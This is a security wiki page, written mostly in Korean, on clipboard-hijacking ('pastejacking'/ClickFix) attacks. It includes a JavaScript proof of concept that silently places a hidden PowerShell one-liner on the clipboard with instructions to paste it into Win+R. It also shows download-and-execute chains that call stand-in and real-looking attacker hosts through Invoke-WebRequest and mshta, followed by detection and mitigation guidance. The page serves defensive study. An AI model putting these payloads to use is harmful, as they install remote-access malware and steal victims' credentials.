# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "절대 자신이 복사하지 않은 것을 붙여넣지 마세요." – 오래된 조언이지만 여전히 유효합니다.

## Overview

Clipboard hijacking – 또한 *pastejacking*으로 알려져 있음 – 사용자가 명령을 검사하지 않고 일상적으로 복사하고 붙여넣는 사실을 악용합니다. 악의적인 웹 페이지(또는 Electron 또는 데스크탑 애플리케이션과 같은 JavaScript를 지원하는 컨텍스트)는 공격자가 제어하는 텍스트를 시스템 클립보드에 프로그래밍 방식으로 삽입합니다. 피해자는 일반적으로 정교하게 제작된 사회 공학 지침에 의해 **Win + R** (실행 대화 상자), **Win + X** (빠른 액세스 / PowerShell)을 누르거나 터미널을 열고 클립보드 내용을 *붙여넣기* 하도록 유도되어 즉시 임의의 명령을 실행하게 됩니다.

**파일이 다운로드되지 않고 첨부파일이 열리지 않기 때문에**, 이 기술은 첨부파일, 매크로 또는 직접 명령 실행을 모니터링하는 대부분의 이메일 및 웹 콘텐츠 보안 제어를 우회합니다. 따라서 이 공격은 NetSupport RAT, Latrodectus 로더 또는 Lumma Stealer와 같은 상용 맬웨어 패밀리를 배포하는 피싱 캠페인에서 인기가 있습니다.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
이전 캠페인은 `document.execCommand('copy')`를 사용했지만, 최신 캠페인은 비동기 **Clipboard API** (`navigator.clipboard.writeText`)에 의존합니다.

## ClickFix / ClearFake 흐름

1. 사용자가 오타가 있는 또는 손상된 사이트(예: `docusign.sa[.]com`)를 방문합니다.
2. 주입된 **ClearFake** JavaScript가 `unsecuredCopyToClipboard()` 헬퍼를 호출하여 Base64로 인코딩된 PowerShell 원라이너를 클립보드에 조용히 저장합니다.
3. HTML 지침은 피해자에게 다음과 같이 말합니다: *“**Win + R**을 누르고, 명령을 붙여넣고 Enter를 눌러 문제를 해결하세요.”*
4. `powershell.exe`가 실행되어 합법적인 실행 파일과 악성 DLL이 포함된 아카이브를 다운로드합니다(고전적인 DLL 사이드로딩).
5. 로더가 추가 단계를 복호화하고, 셸코드를 주입하며, 지속성을 설치합니다(예: 예약 작업) – 궁극적으로 NetSupport RAT / Latrodectus / Lumma Stealer를 실행합니다.

### 예시 NetSupport RAT 체인
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (정상적인 Java WebStart)는 자신의 디렉토리에서 `msvcp140.dll`을 검색합니다.
* 악성 DLL은 **GetProcAddress**로 API를 동적으로 해결하고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드하며, `"https://google.com/"`라는 롤링 XOR 키를 사용하여 이를 복호화하고, 최종 셸코드를 주입하며 **client32.exe** (NetSupport RAT)를 `C:\ProgramData\SecurityCheck_v1\`에 압축 해제합니다.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**로 `la.txt` 다운로드
2. **cscript.exe** 내에서 JScript 다운로더 실행
3. MSI 페이로드를 가져옴 → 서명된 애플리케이션 옆에 `libcef.dll` 드롭 → DLL 사이드로딩 → 셸코드 → Latrodectus.

### MSHTA를 통한 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 호출은 숨겨진 PowerShell 스크립트를 실행하여 `PartyContinued.exe`를 검색하고, `Boat.pst` (CAB)를 추출하며, `extrac32` 및 파일 연결을 통해 `AutoIt3.exe`를 재구성한 후, 브라우저 자격 증명을 `sumeriavgv.digital`로 유출하는 `.a3x` 스크립트를 실행합니다.

## 탐지 및 사냥

블루팀은 클립보드, 프로세스 생성 및 레지스트리 텔레메트리를 결합하여 pastejacking 남용을 정확히 찾아낼 수 있습니다:

* Windows 레지스트리: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`는 **Win + R** 명령의 기록을 유지합니다 – 비정상적인 Base64 / 난독화된 항목을 찾아보세요.
* 보안 이벤트 ID **4688** (프로세스 생성)에서 `ParentImage` == `explorer.exe`이고 `NewProcessName`이 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }에 있는 경우.
* 의심스러운 4688 이벤트 직전에 `%LocalAppData%\Microsoft\Windows\WinX\` 또는 임시 폴더에서 파일 생성에 대한 이벤트 ID **4663**.
* EDR 클립보드 센서 (존재하는 경우) – `Clipboard Write`가 새로운 PowerShell 프로세스에 의해 즉시 이어지는지 상관관계 분석.

## 완화 조치

1. 브라우저 강화 – 클립보드 쓰기 접근을 비활성화 (`dom.events.asyncClipboard.clipboardItem` 등)하거나 사용자 제스처를 요구합니다.
2. 보안 인식 – 사용자에게 민감한 명령을 *타이핑* 하거나 먼저 텍스트 편집기에 붙여넣도록 교육합니다.
3. PowerShell 제한 언어 모드 / 실행 정책 + 응용 프로그램 제어를 통해 임의의 원라이너를 차단합니다.
4. 네트워크 제어 – 알려진 pastejacking 및 악성 C2 도메인에 대한 아웃바운드 요청을 차단합니다.

## 관련 트릭

* **Discord 초대 하이재킹**은 사용자를 악성 서버로 유인한 후 동일한 ClickFix 접근 방식을 자주 남용합니다:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 참조

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
